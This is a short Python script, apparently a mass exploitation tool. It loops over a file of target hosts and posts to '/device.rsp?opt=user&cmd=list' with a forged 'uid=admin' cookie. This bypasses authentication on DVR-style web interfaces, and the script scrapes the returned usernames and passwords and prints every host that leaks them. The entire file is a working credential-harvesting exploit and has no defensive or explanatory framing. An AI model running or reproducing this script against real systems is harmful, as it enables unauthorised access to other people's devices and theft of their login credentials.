import sys, os, requests
from host import host
class rspExploit:
    def rspExploit(self):
        cookie = {'uid': 'admin'}
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                url = "http://"+ address['ip'] +":" + str(address['port']) +"/device.rsp?opt=user&cmd=list"
                response = requests.post(url, cookies=cookie)
                userpass = str(response.content)
                patternUsername = '''uid":"'''
                patternPassword = '''"pwd":"'''
                patternEnd = '''","'''
                user = userpass.partition(patternUsername)[2]
                username = user.partition(patternEnd)[0]
                passw = userpass.partition(patternPassword)[2]
                password = passw.partition(patternEnd)[0]
                if username =="" and password =="":
                    pass
                elif password != "" or username !="" :
                    print("[-]Found  http://" + address['ip'] + ":" + str(address['port']) +"  with " + username + ":" + password)
            except:
                pass
            a += 1
